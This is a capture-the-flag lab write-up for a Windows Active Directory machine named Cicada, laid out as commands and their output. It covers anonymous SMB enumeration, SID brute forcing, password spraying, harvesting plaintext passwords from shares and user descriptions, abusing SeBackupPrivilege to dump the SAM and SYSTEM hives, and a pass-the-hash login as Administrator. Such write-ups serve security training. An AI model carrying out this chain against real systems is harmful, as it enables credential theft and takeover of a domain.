## Cicada

### Lab Details 

- Difficulty:
- Type: SMB, Active Directory, Windows

#### Enumeration
- run `nmap`

- perform share listing anonymously 
```bash
$ smbclient -L //10.129.116.59/
Password for [WORKGROUP\ch4os1]:

	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	C$              Disk      Default share
	DEV             Disk      
	HR              Disk      
	IPC$            IPC       Remote IPC
	NETLOGON        Disk      Logon server share 
	SYSVOL          Disk      Logon server share 
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.129.116.59 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
```
- we attempt to read `DEV` we get access denied error but we have read access over `HR` share
- download all remote file from `HR` Share
```bash
$ smbclient //10.129.116.59/HR
Password for [WORKGROUP\ch4os1]:
Try "help" to get a list of possible commands.
smb: \> recurse on
smb: \> prompt off
smb: \> mget *
getting file \Notice from HR.txt of size 1266 as Notice from HR.txt (154.5 KiloBytes/sec) (average 154.5 KiloBytes/sec)
```
- investigate the download file, we spot a password
```bash
$ cat Notice\ from\ HR.txt 

Dear new hire!

Welcome to Cicada Corp! We're thrilled to have you join our team. As part of our security protocols, it's essential that you change your default password to something unique and secure.

Your default password is: Cicada$M6Corpb*@Lp#nZp!8

To change your password:

1. Log in to your Cicada Corp account** using the provided username and the default password mentioned above.
2. Once logged in, navigate to your account settings or profile settings section.
3. Look for the option to change your password. This will be labeled as "Change Password".
4. Follow the prompts to create a new password**. Make sure your new password is strong, containing a mix of uppercase letters, lowercase letters, numbers, and special characters.
5. After changing your password, make sure to save your changes.

Remember, your password is a crucial aspect of keeping your account secure. Please do not share your password with anyone, and ensure you use a complex password.

If you encounter any issues or need assistance with changing your password, don't hesitate to reach out to our support team at support@cicada.htb.

Thank you for your attention to this matter, and once again, welcome to the Cicada Corp team!

Best regards,
Cicada Corp
```
#### Initial Foothold 
- we can use `impacket-lookupsid` to enumerate AD users in the domain
```bash
$ impacket-lookupsid anonymous@cicada.htb -no-pass
Impacket v0.13.0.dev0+20250130.104306.0f4b866 - Copyright Fortra, LLC and its affiliated companies 

[*] Brute forcing SIDs at cicada.htb
[*] StringBinding ncacn_np:cicada.htb[\pipe\lsarpc]
[*] Domain SID is: S-1-5-21-917908876-1423158569-3159038727
498: CICADA\Enterprise Read-only Domain Controllers (SidTypeGroup)
500: CICADA\Administrator (SidTypeUser)
501: CICADA\Guest (SidTypeUser)
502: CICADA\krbtgt (SidTypeUser)
512: CICADA\Domain Admins (SidTypeGroup)
513: CICADA\Domain Users (SidTypeGroup)
514: CICADA\Domain Guests (SidTypeGroup)
515: CICADA\Domain Computers (SidTypeGroup)
516: CICADA\Domain Controllers (SidTypeGroup)
517: CICADA\Cert Publishers (SidTypeAlias)
518: CICADA\Schema Admins (SidTypeGroup)
519: CICADA\Enterprise Admins (SidTypeGroup)
520: CICADA\Group Policy Creator Owners (SidTypeGroup)
521: CICADA\Read-only Domain Controllers (SidTypeGroup)
522: CICADA\Cloneable Domain Controllers (SidTypeGroup)
525: CICADA\Protected Users (SidTypeGroup)
526: CICADA\Key Admins (SidTypeGroup)
527: CICADA\Enterprise Key Admins (SidTypeGroup)
553: CICADA\RAS and IAS Servers (SidTypeAlias)
571: CICADA\Allowed RODC Password Replication Group (SidTypeAlias)
572: CICADA\Denied RODC Password Replication Group (SidTypeAlias)
1000: CICADA\CICADA-DC$ (SidTypeUser)
1101: CICADA\DnsAdmins (SidTypeAlias)
1102: CICADA\DnsUpdateProxy (SidTypeGroup)
1103: CICADA\Groups (SidTypeGroup)
1104: CICADA\john.smoulder (SidTypeUser)
1105: CICADA\sarah.dantelia (SidTypeUser)
1106: CICADA\michael.wrightson (SidTypeUser)
1108: CICADA\david.orelious (SidTypeUser)
1109: CICADA\Dev Support (SidTypeGroup)
1601: CICADA\emily.oscars (SidTypeUser)
```
- save only the user accounts
```bash
$ cat users 
CICADA\john.smoulder
CICADA\sarah.dantelia
CICADA\michael.wrightson
CICADA\david.orelious
CICADA\emily.oscars
```
- enumerate users with the default password
- found user `michael.wrightson` uses the default password
```bash
$ nxc smb 10.129.116.59  -u ./users -p ./password --continue-on-success
SMB         10.129.116.59   445    CICADA-DC        [*] Windows Server 2022 Build 20348 x64 (name:CICADA-DC) (domain:cicada.htb) (signing:True) (SMBv1:False)
SMB         10.129.116.59   445    CICADA-DC        [-] CICADA\john.smoulder:Cicada$M6Corpb*@Lp#nZp!8 STATUS_LOGON_FAILURE 
SMB         10.129.116.59   445    CICADA-DC        [-] CICADA\sarah.dantelia:Cicada$M6Corpb*@Lp#nZp!8 STATUS_LOGON_FAILURE 
SMB         10.129.116.59   445    CICADA-DC        [+] CICADA\michael.wrightson:Cicada$M6Corpb*@Lp#nZp!8 
SMB         10.129.116.59   445    CICADA-DC        [-] CICADA\david.orelious:Cicada$M6Corpb*@Lp#nZp!8 STATUS_LOGON_FAILURE 
SMB         10.129.116.59   445    CICADA-DC        [-] CICADA\emily.oscars:Cicada$M6Corpb*@Lp#nZp!8 STATUS_LOGON_FAILURE
```
- use `nxc` to enumerate AD users and found note left by `david.orelious` which is the account password
```bash
$ nxc smb 10.129.116.59 -u "michael.wrightson" -p 'Cicada$M6Corpb*@Lp#nZp!8' --users
SMB         10.129.116.59   445    CICADA-DC        [*] Windows Server 2022 Build 20348 x64 (name:CICADA-DC) (domain:cicada.htb) (signing:True) (SMBv1:False)
SMB         10.129.116.59   445    CICADA-DC        [+] cicada.htb\michael.wrightson:Cicada$M6Corpb*@Lp#nZp!8 
SMB         10.129.116.59   445    CICADA-DC        -Username-                    -Last PW Set-       -BadPW- -Description-                                             
SMB         10.129.116.59   445    CICADA-DC        Administrator                 2024-08-26 20:08:03 0       Built-in account for administering the computer/domain 
SMB         10.129.116.59   445    CICADA-DC        Guest                         2024-08-28 17:26:56 0       Built-in account for guest access to the computer/domain 
SMB         10.129.116.59   445    CICADA-DC        krbtgt                        2024-03-14 11:14:10 0       Key Distribution Center Service Account 
SMB         10.129.116.59   445    CICADA-DC        john.smoulder                 2024-03-14 12:17:29 5        
SMB         10.129.116.59   445    CICADA-DC        sarah.dantelia                2024-03-14 12:17:29 5        
SMB         10.129.116.59   445    CICADA-DC        michael.wrightson             2024-03-14 12:17:29 0        
SMB         10.129.116.59   445    CICADA-DC        david.orelious                2024-03-14 12:17:29 4       Just in case I forget my password is aRt$Lp#7t*VQ!3 
SMB         10.129.116.59   445    CICADA-DC        emily.oscars                  2024-08-22 21:20:17 4        
```
- enumerate SMB share again and found that `david` has read access over `DEV` share
```bash
$ nxc smb 10.129.116.59 -u "david.orelious" -p 'aRt$Lp#7t*VQ!3' --shares
SMB         10.129.116.59   445    CICADA-DC        [*] Windows Server 2022 Build 20348 x64 (name:CICADA-DC) (domain:cicada.htb) (signing:True) (SMBv1:False)
SMB         10.129.116.59   445    CICADA-DC        [+] cicada.htb\david.orelious:aRt$Lp#7t*VQ!3 
SMB         10.129.116.59   445    CICADA-DC        [*] Enumerated shares
SMB         10.129.116.59   445    CICADA-DC        Share           Permissions     Remark
SMB         10.129.116.59   445    CICADA-DC        -----           -----------     ------
SMB         10.129.116.59   445    CICADA-DC        ADMIN$                          Remote Admin
SMB         10.129.116.59   445    CICADA-DC        C$                              Default share
SMB         10.129.116.59   445    CICADA-DC        DEV             READ            
SMB         10.129.116.59   445    CICADA-DC        HR              READ            
SMB         10.129.116.59   445    CICADA-DC        IPC$            READ            Remote IPC
SMB         10.129.116.59   445    CICADA-DC        NETLOGON        READ            Logon server share 
SMB         10.129.116.59   445    CICADA-DC        SYSVOL          READ            Logon server share 
```
- download all remote file in `DEV` share
```bash
$ smbclient //10.129.116.59/DEV -U david.orelious
Password for [WORKGROUP\david.orelious]:
Try "help" to get a list of possible commands.
smb: \> recurse on
smb: \> prompt off
smb: \> mget *
getting file \Backup_script.ps1 of size 601 as Backup_script.ps1 (83.8 KiloBytes/sec) (average 83.8 KiloBytes/sec)
smb: \> exit
```
- investigate the script file and found credential for user `emily.oscars`
```
$ cat Backup_script.ps1 

$sourceDirectory = "C:\smb"
$destinationDirectory = "D:\Backup"

$username = "emily.oscars"
$password = ConvertTo-SecureString "Q!3@Lp#M6b*7t*Vt" -AsPlainText -Force
$credentials = New-Object System.Management.Automation.PSCredential($username, $password)
$dateStamp = Get-Date -Format "yyyyMMdd_HHmmss"
$backupFileName = "smb_backup_$dateStamp.zip"
$backupFilePath = Join-Path -Path $destinationDirectory -ChildPath $backupFileName
Compress-Archive -Path $sourceDirectory -DestinationPath $backupFilePath
Write-Host "Backup completed successfully. Backup file saved to: $backupFilePath"

```
#### Lateral Movement (If any)

#### Privilege Escalation
- get reverse shell via `evil-winrm` with user `emily.oscars` credential
- enumerate user access
```bash
*Evil-WinRM* PS C:\Users\emily.oscars.CICADA\Desktop> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeBackupPrivilege             Back up files and directories  Enabled
SeRestorePrivilege            Restore files and directories  Enabled
SeShutdownPrivilege           Shut down the system           Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled


*Evil-WinRM* PS C:\Users\emily.oscars.CICADA\Desktop> net user emily.oscars
User name                    emily.oscars
Full Name                    Emily Oscars
Comment
User's comment
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            8/22/2024 2:20:17 PM
Password expires             Never
Password changeable          8/23/2024 2:20:17 PM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script
User profile
Home directory
Last logon                   9/27/2025 3:20:10 PM

Logon hours allowed          All

Local Group Memberships      *Backup Operators     *Remote Management Use
Global Group memberships     *Domain Users
The command completed successfully.
```
- search online for `SeBackupPrivilege Privilege Escalation` [found](https://www.hackingarticles.in/windows-privilege-escalation-sebackupprivilege/)
- we can use the backup privilege to back `SAM` and `System` registry hives
```bash
## we can backup registry hive
cd c:\
mkdir Temp
reg save hklm\sam c:\Temp\sam
reg save hklm\system c:\Temp\system
```
- download the registry hives to local
```bash
## download the sam and system registry hive
cd Temp
download sam
download system
```
- extracting Hashes with Pypykatz and Gaining Access
```bash
$ pypykatz registry --sam sam system
WARNING:pypykatz:SECURITY hive path not supplied! Parsing SECURITY will not work
WARNING:pypykatz:SOFTWARE hive path not supplied! Parsing SOFTWARE will not work
============== SYSTEM hive secrets ==============
CurrentControlSet: ControlSet001
Boot Key: 3c2b033757a49110a9ee680b46e8d620
============== SAM hive secrets ==============
HBoot Key: a1c299e572ff8c643a857d3fdb3e5c7c10101010101010101010101010101010
Administrator:500:aad3b435b51404eeaad3b435b51404ee:2b87e7c93a3e8a0ea4a581937016f341:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
```
- get shell via `evil-winrm`
```bash
$ evil-winrm -i 10.129.116.59 -u Administrator -H 2b87e7c93a3e8a0ea4a581937016f341
                                        
Evil-WinRM shell v3.5
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
cicada\administrator
```
#### Resources

#### Lesson Learned
